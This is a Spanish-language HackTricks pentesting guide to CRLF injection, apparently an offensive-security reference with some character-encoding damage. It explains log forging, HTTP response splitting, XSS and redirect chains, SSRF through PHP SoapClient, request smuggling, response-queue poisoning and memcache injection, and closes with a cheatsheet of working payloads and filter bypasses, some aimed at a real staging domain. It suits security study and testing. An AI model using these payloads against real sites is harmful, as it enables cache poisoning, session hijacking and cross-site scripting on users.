# Inyecci√≥n de CRLF (%0D%0A)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y en hackear lo imposible - ¬°estamos contratando! (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## ¬øQu√© es CRLF?

Cuando un navegador env√≠a una solicitud a un servidor web, el servidor web responde con una respuesta que contiene tanto los encabezados de respuesta HTTP como el contenido real del sitio web, es decir, el cuerpo de la respuesta. Los encabezados HTTP y la respuesta HTML (el contenido del sitio web) est√°n separados por una combinaci√≥n espec√≠fica de caracteres especiales, a saber, un retorno de carro y un avance de l√≠nea. En resumen, tambi√©n se conocen como CRLF.

El servidor web utiliza el CRLF para entender cu√°ndo comienza un nuevo encabezado HTTP y cu√°ndo termina otro. El CRLF tambi√©n puede indicar a una aplicaci√≥n web o a un usuario que comienza una nueva l√≠nea en un archivo o en un bloque de texto. Los caracteres CRLF son un mensaje est√°ndar HTTP/1.1, por lo que se utilizan en cualquier tipo de servidor web, incluidos Apache, Microsoft IIS y todos los dem√°s.\
De [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### ¬øQu√© es la vulnerabilidad de inyecci√≥n de CRLF?

En un ataque de vulnerabilidad de inyecci√≥n de CRLF, el atacante inserta tanto los caracteres de retorno de carro como de avance de l√≠nea en la entrada del usuario para enga√±ar al servidor, la aplicaci√≥n web o al usuario para que piense que se ha terminado un objeto y que ha comenzado otro. Como tales, las secuencias CRLF no son caracteres maliciosos, sin embargo, pueden ser utilizados con intenciones maliciosas, para la divisi√≥n de respuestas HTTP, etc.

## Inyecci√≥n de CRLF en aplicaciones web

En las aplicaciones web, una inyecci√≥n de CRLF puede tener graves impactos, dependiendo de lo que la aplicaci√≥n haga con los elementos individuales. Los impactos pueden variar desde la divulgaci√≥n de informaci√≥n hasta la ejecuci√≥n de c√≥digo, una vulnerabilidad de seguridad directa de la aplicaci√≥n web. De hecho, un ataque de inyecci√≥n de CRLF puede tener repercusiones muy graves en una aplicaci√≥n web, aunque nunca se haya incluido en la lista OWASP Top 10. Por ejemplo, tambi√©n es posible manipular archivos de registro en un panel de administraci√≥n, como se explica en el siguiente ejemplo.

#### Un ejemplo de inyecci√≥n de CRLF en un archivo de registro

Imagina un archivo de registro en un panel de administraci√≥n con el patr√≥n de flujo de salida de IP - Hora - Ruta visitada, como el siguiente:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Si un atacante es capaz de inyectar los caracteres CRLF en la solicitud HTTP, puede cambiar el flujo de salida y falsificar las entradas de registro. Puede cambiar la respuesta de la aplicaci√≥n web a algo como lo siguiente:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
El %0d y %0a son las formas codificadas en URL de CR y LF. Por lo tanto, las entradas de registro se ver√≠an as√≠ despu√©s de que el atacante insertara esos caracteres y la aplicaci√≥n los mostrara:

IP - Tiempo - Ruta visitada
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Por lo tanto, al explotar una vulnerabilidad de inyecci√≥n CRLF, el atacante puede falsificar entradas en el archivo de registro para ocultar sus propias acciones maliciosas. El atacante est√° literalmente secuestrando la p√°gina y modificando la respuesta. Por ejemplo, imagina un escenario en el que el atacante tiene la contrase√±a de administrador y ejecuta el par√°metro de acci√≥n restringida, que solo puede ser utilizado por un administrador.

El problema es que si el administrador nota que una direcci√≥n IP desconocida utiliz√≥ el par√°metro de acci√≥n restringida, notar√° que algo est√° mal. Sin embargo, como ahora parece que el comando fue emitido por el localhost (y por lo tanto probablemente por alguien que tiene acceso al servidor, como un administrador), no parece sospechoso.

Toda la parte de la consulta que comienza con %0d%0a ser√° manejada por el servidor como un solo par√°metro. Despu√©s de eso, hay otro & con el par√°metro de acci√≥n restringida que ser√° analizado por el servidor como otro par√°metro. Efectivamente, esta ser√≠a la misma consulta que:
```
/index.php?page=home&restrictedaction=edit
```
### Inyecci√≥n de Respuesta HTTP

#### Descripci√≥n

Dado que el encabezado de una respuesta HTTP y su cuerpo est√°n separados por caracteres CRLF, un atacante puede intentar inyectarlos. Una combinaci√≥n de CRLFCRLF indicar√° al navegador que el encabezado termina y el cuerpo comienza. Eso significa que ahora puede escribir datos dentro del cuerpo de la respuesta donde se almacena el c√≥digo HTML. Esto puede llevar a una vulnerabilidad de Cross-site Scripting.

#### Un ejemplo de Inyecci√≥n de Respuesta HTTP que lleva a XSS

Imagina una aplicaci√≥n que establece un encabezado personalizado, por ejemplo:
```
X-Your-Name: Bob
```
El valor del encabezado se establece a trav√©s de un par√°metro get llamado "name". Si no hay codificaci√≥n de URL y el valor se refleja directamente dentro del encabezado, es posible que un atacante inserte la combinaci√≥n mencionada anteriormente de CRLFCRLF para indicar al navegador que comienza el cuerpo de la solicitud. De esta manera, puede insertar datos como carga √∫til XSS, por ejemplo:
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
El ejemplo anterior mostrar√° una ventana de alerta en el contexto del dominio atacado.

#### Un ejemplo de HTTP Response Splitting que lleva a una redirecci√≥n

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

Navegador a:
```
/%0d%0aLocation:%20http://myweb.com
```
Y el servidor responde con la cabecera:
```
Location: http://myweb.com
```
**Otro ejemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### En la ruta de URL

Puedes enviar el payload **dentro de la ruta de la URL** para controlar la **respuesta** del servidor:
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
### Inyecci√≥n de cabecera HTTP

#### Descripci√≥n

Al explotar una inyecci√≥n CRLF, un atacante tambi√©n puede insertar cabeceras HTTP que podr√≠an usarse para derrotar mecanismos de seguridad como el filtro XSS del navegador o la pol√≠tica de mismo origen. Esto permite al atacante obtener informaci√≥n sensible como tokens CSRF. Tambi√©n puede establecer cookies que podr√≠an ser explotadas al iniciar sesi√≥n en la cuenta del atacante o al explotar vulnerabilidades de scripting entre sitios (XSS) de otra manera no explotables.

#### Un ejemplo de inyecci√≥n de cabecera HTTP para extraer datos sensibles

Si un atacante puede inyectar las cabeceras HTTP que activan CORS (Compartici√≥n de recursos de origen cruzado), puede usar JavaScript para acceder a recursos que de otra manera estar√≠an protegidos por SOP (Pol√≠tica de mismo origen), que impide que los sitios de diferentes or√≠genes se accedan entre s√≠.

### Nueva solicitud HTTP en SSRF

Al abusar de la inyecci√≥n CRLF, se puede **crear una nueva solicitud HTTP e inyectarla**.\
Un buen ejemplo se puede hacer usando el gadget de deserializaci√≥n `SoapClient` en PHP. Esta clase es **vulnerable a CRLF** dentro del par√°metro `user_agent`, lo que permite **insertar nuevas cabeceras y contenido del cuerpo**. Sin embargo, incluso se puede abusar de esta vulnerabilidad para **inyectar una nueva solicitud HTTP:**
```php
$target = 'http://127.0.0.1:9090/test'; 
$post_string = 'variable=post value';
$crlf = array(
    'POST /proxy HTTP/1.1',
    'Host: local.host.htb',
    'Cookie: PHPSESSID=[PHPSESSID]',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: '.(string)strlen($post_string),
    "\r\n",
    $post_string
);

$client = new SoapClient(null,
    array(
        'uri'=>$target,
        'location'=>$target,
        'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
    )
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### Inyecci√≥n de cabeceras para Request Smuggling

Puedes inyectar cabeceras esenciales para asegurarte de que el **back-end mantiene la conexi√≥n abierta** despu√©s de responder a la solicitud inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
A continuaci√≥n, **especifique una segunda solicitud**. Aqu√≠ tiene un **cl√°sico** [**smuggling de solicitud HTTP**](http-request-smuggling/) con **encabezados/cuerpo adicionales** agregados por el servidor despu√©s de la inyecci√≥n.\
Aqu√≠ hay dos de las muchas opciones para la explotaci√≥n entre usuarios.

Especificar un **prefijo malicioso** para envenenar la solicitud del siguiente usuario o una cach√© web:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

O crear nuestro prefijo para combinarlo con la basura final y crear una segunda solicitud completa para desencadenar el **envenenamiento de la cola de respuestas**.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

Para obtener m√°s informaci√≥n sobre esta t√©cnica y los posibles problemas, [**consulte la fuente original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

### Inyecci√≥n de Memcache

Memcache es un **almacenamiento de clave-valor que utiliza un protocolo de texto claro**. M√°s informaci√≥n en:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

Si una plataforma est√° tomando **datos de una solicitud HTTP y us√°ndolos sin sanitizar** para realizar **solicitudes** a un servidor **memcache**, un atacante podr√≠a abusar de este comportamiento para **inyectar nuevos comandos de memcache**.

Por ejemplo, en la vulnerabilidad original descubierta, las claves de cach√© se usaban para devolver la direcci√≥n IP y el puerto al que un usuario deb√≠a conectarse, y los atacantes pod√≠an **inyectar comandos de memcache** que **envenenar√≠an** la **cach√© para enviar los detalles de las v√≠ctimas** (incluidos los nombres de usuario y las contrase√±as) a los servidores del atacante:

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Adem√°s, los investigadores tambi√©n descubrieron que pod√≠an desincronizar las respuestas de memcache para enviar las direcciones IP y los puertos de los atacantes a los usuarios cuyo correo electr√≥nico el atacante no conoc√≠a:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Para obtener la informaci√≥n completa, lea el** [**informe original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)\*\*\*\*

## Impactos de la Vulnerabilidad de Inyecci√≥n CRLF

El impacto de las inyecciones CRLF var√≠a e incluye todos los impactos de la ejecuci√≥n de c√≥digo en sitios cruzados hasta la divulgaci√≥n de informaci√≥n. Tambi√©n puede desactivar ciertas restricciones de seguridad como los filtros XSS y la Pol√≠tica de Origen de la misma en los navegadores de la v√≠ctima, dej√°ndolos susceptibles a ataques maliciosos.

### C√≥mo prevenir las inyecciones CRLF / HTTP Header en aplicaciones web

La mejor t√©cnica de prevenci√≥n es no usar la entrada de los usuarios directamente dentro de los encabezados de respuesta. Si eso no es posible, siempre debe usar una funci√≥n para codificar los caracteres especiales CRLF. Otra buena pr√°ctica de seguridad de aplicaciones web es actualizar su lenguaje de programaci√≥n a una versi√≥n que no permita que CR y LF se inyecten dentro de las funciones que establecen los encabezados HTTP.

### CHEATSHEET
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2 
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Herramienta

{% embed url="https://github.com/dwisiswant0/crlfuzz" %}

## Lista de detecci√≥n de fuerza bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt" %}

## Referencias

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y en hackear lo imposible - ¬°**estamos contratando!** (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
